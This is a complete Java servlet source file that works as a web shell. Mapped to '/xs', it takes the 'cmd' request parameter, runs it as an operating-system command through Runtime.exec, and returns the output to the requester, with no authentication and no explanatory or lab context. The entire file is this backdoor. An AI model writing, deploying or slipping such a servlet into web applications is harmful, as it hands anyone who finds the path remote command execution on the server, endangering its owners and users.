import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;

@WebServlet("/xs")
public class XsServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException, IOException {
        String cmd = req.getParameter("cmd");
        InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();
        BufferedInputStream bis = new BufferedInputStream(is);
        int len;
        while ((len = bis.read())!=-1){
            resp.getWriter().write(len);
        }

    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doGet(req,resp);

    }
}